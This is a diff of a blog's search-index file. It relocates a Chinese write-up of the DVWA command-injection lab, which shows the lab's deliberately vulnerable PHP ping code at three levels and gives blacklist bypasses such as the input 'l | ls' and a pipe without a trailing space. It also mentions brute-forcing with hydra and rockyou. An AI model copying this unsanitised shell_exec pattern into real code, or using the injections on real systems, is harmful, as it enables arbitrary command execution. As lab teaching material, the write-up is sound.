= shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">                                </span><br></pre></td></tr></table></figure>
-
-<p>完善了黑名单，但是存在一个问题</p>
-<p><img src="./dvwa-command-injection/command-injection_high1.png" alt="img"></p>
-<p>由于代码写的是 <code>| </code> 而不是 <code>|</code> 所以不加空格就可以绕过</p>
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>dvwa</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>web</tag>
-        <tag>dvwa</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>dvwa-brute-force</title>
     <url>//brute-force.html</url>
     <content><![CDATA[<p>dvwa靶场的暴力破解部分</p>
@@ -2859,6 +2825,40 @@
 <p>步骤都是一样的，但是这次对于字典有一定的要求了</p>
 <p>之前我那本字典不够用了，所以就没有爆破出来</p>
 <p>使用<code>hydra + rock_you</code>就爆出来了（不过出来了很多）</p>
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>dvwa</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>web</tag>
+        <tag>dvwa</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dvwa-command-injection</title>
+    <url>//command-injection.html</url>
+    <content><![CDATA[<p>dvwa靶场的命令注入部分</p>
+<a id="more"></a>
+
+<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">                                </span><br></pre></td></tr></table></figure>
+
+<p><img src="./dvwa-command-injection/command-injection_low1.png" alt="img"></p>
+<p><img src="./dvwa-command-injection/command-injection_low2.png" alt="img"></p>
+<p>由于命令执行的时候没有对输入做检测，使用一些特殊的符号可以绕过。<br>最简单的可以使用 <code>; | &amp;&amp; &amp;</code> 绕过。例如输入<code>l | ls</code><br>此时命令会变成 <code>ping l | ls</code>ls指令也会被执行。</p>
+<p>注：<code>;``|</code>是Linux终端命令的分隔符</p>
+<h2 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">                                </span><br></pre></td></tr></table></figure>
+
+<p>增加了一个操作，过滤了&amp;&amp; 和 ;操作符，但是没有过滤 | 和 &amp;</p>
+<p><img src="./dvwa-command-injection/command-injection_middle1.png" alt="img"></p>
+<p><img src="./dvwa-command-injection/command-injection_middle2.png" alt="img"></p>
+<p>由于过滤并不完全，导致存在漏网之鱼。</p>
+<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">                                </span><br></pre></td></tr></table></figure>
+
+<p>完善了黑名单，但是存在一个问题</p>
+<p><img src="./dvwa-command-injection/command-injection_high1.png" alt="img"></p>
+<p>由于代码写的是 <code>| </code> 而不是 <code>|</code> 所以不加空格就可以绕过</p>
 ]]></content>
       <categories>
         <category>web</category>
